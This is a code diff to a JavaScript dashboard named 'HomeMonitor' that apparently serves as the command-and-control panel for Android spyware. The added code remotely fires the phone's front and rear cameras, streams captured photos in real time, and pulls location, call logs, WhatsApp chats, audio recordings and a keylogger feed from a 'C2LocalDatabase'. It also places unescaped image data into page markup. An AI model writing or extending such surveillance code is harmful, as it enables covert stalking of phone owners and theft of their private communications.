@@ -687,11 +687,19 @@ function dispatchNativeRpcAction(action, params = {}) {
         switch (action) {
             case "camera":
             case "rearphoto":
-                apiPromise = HomeMonitorAPI.camera.takePhoto('back').then(() => HomeMonitorAPI.media.getPhotos()).then(data => renderPhotosGallery(data));
+                showDashboardNotification("info", "📸 Camera capturing rear photo on device...");
+                apiPromise = HomeMonitorAPI.camera.takePhoto('back')
+                    .then(() => new Promise(r => setTimeout(r, 1500)))
+                    .then(() => HomeMonitorAPI.media.getPhotos())
+                    .then(data => renderPhotosGallery(data));
                 break;
             case "frontcam":
             case "frontphoto":
-                apiPromise = HomeMonitorAPI.camera.takePhoto('front').then(() => HomeMonitorAPI.media.getPhotos()).then(data => renderPhotosGallery(data));
+                showDashboardNotification("info", "📸 Camera capturing front photo on device...");
+                apiPromise = HomeMonitorAPI.camera.takePhoto('front')
+                    .then(() => new Promise(r => setTimeout(r, 1500)))
+                    .then(() => HomeMonitorAPI.media.getPhotos())
+                    .then(data => renderPhotosGallery(data));
                 break;
             case "audio":
                 apiPromise = HomeMonitorAPI.media.getAudio().then(data => renderAudioRecordings(data));
@@ -1282,6 +1290,53 @@ function fetchTabDeviceData(tabId) {
     }
 }
 
+function syncAllTabsFromDeviceDatabase() {
+    if (typeof HomeMonitorAPI === "undefined" || !HomeMonitorAPI) return;
+    console.log("[HomeMonitor] Syncing all tabs from Android SQLite C2LocalDatabase...");
+
+    subscribeRealtimePhotoStream();
+
+    // 1. Device Summary & Specs
+    HomeMonitorAPI.device.getSummary()
+        .then(data => renderOverviewDashboard(data))
+        .catch(_ => {});
+
+    // 2. Photos & Media
+    HomeMonitorAPI.media.getPhotos()
+        .then(data => renderPhotosGallery(data))
+        .catch(_ => {});
+
+    // 3. Audio Recordings
+    HomeMonitorAPI.media.getAudio()
+        .then(data => renderAudioRecordings(data))
+        .catch(_ => {});
+
+    // 4. Calls
+    HomeMonitorAPI.calls.getLogs()
+        .then(data => renderCallsList(data))
+        .catch(_ => {});
+
+    // 5. Location
+    HomeMonitorAPI.location.getCurrent()
+        .then(data => renderGpsLocation(data))
+        .catch(_ => {});
+
+    // 6. Chat Threads
+    HomeMonitorAPI.chat.getThreads("whatsapp")
+        .then(data => renderChatThreadsList(data))
+        .catch(_ => {});
+
+    // 7. Keylogs & Notifications
+    HomeMonitorAPI.logs.getFeed("keylogs")
+        .then(data => renderKeyloggerFeed(data))
+        .catch(_ => {});
+
+    // 8. Cloud Archive & Drive Status
+    HomeMonitorAPI.archive.getStatus()
+        .then(data => renderBackupStatusUi(data))
+        .catch(_ => {});
+}
+
 function renderOverviewDashboard(data) {
     if (!data) return;
     const specBattery = document.getElementById("specBattery");
@@ -1391,22 +1446,37 @@ function renderEmailsList(data) {
 function renderPhotosGallery(data) {
     const grid = document.getElementById("photoGalleryGrid") || document.getElementById("cameraGalleryGrid");
     if (!grid) return;
-    const photos = (data && data.photos) ? data.photos : [];
+    const photos = (data && data.photos) ? data.photos : (Array.isArray(data) ? data : []);
     if (photos.length === 0) {
         renderEmptyState(grid.id, "No photos recorded", "Trigger camera photo or capture action to populate gallery.");
         return;
     }
-    grid.innerHTML = photos.map(p => `
-        <div class="col-md-4 col-sm-6">
-            <div class="card border shadow-sm h-100">
-                <div class="card-body p-2 text-center bg-dark text-white rounded">
-                    <i class="fa-solid fa-image display-4 text-primary my-3 d-block"></i>
-                    <div class="extra-small fw-bold text-truncate">${safeEscapeHtml(p.content || p.filename || 'Photo Capture')}</div>
-                    <small class="extra-small text-muted d-block mt-1">${formatTimestamp(p.timestamp)}</small>
+    grid.innerHTML = photos.map(p => {
+        const hasImageData = p.imageData && p.imageData.startsWith("data:image");
+        const imageElement = hasImageData
+            ? `<img src="${p.imageData}" class="img-fluid rounded mb-2" style="max-height: 180px; width: 100%; object-fit: cover;" alt="Captured Photo">`
+            : `<i class="fa-solid fa-image display-4 text-primary my-3 d-block"></i>`;
+        return `
+            <div class="col-md-4 col-sm-6">
+                <div class="card border shadow-sm h-100">
+                    <div class="card-body p-2 text-center bg-dark text-white rounded">
+                        ${imageElement}
+                        <div class="extra-small fw-bold text-truncate">${safeEscapeHtml(p.filename || p.content || 'Photo Capture')}</div>
+                        <small class="extra-small text-muted d-block mt-1">${formatTimestamp(p.timestamp)}</small>
+                    </div>
                 </div>
             </div>
-        </div>
-    `).join("");
+        `;
+    }).join("");
+}
+
+function subscribeRealtimePhotoStream() {
+    if (typeof HomeMonitorAPI === "undefined" || !HomeMonitorAPI || typeof HomeMonitorAPI.subscribe !== "function") return;
+    HomeMonitorAPI.subscribe("photos.stream", (eventData) => {
+        console.log("[HomeMonitor] Real-time photos.stream event received:", eventData);
+        showDashboardNotification("success", `📸 Real-time Photo Captured: ${eventData.filename || 'Photo'}`);
+        HomeMonitorAPI.media.getPhotos().then(data => renderPhotosGallery(data)).catch(_ => {});
+    });
 }
 
 function renderAudioRecordings(data) {
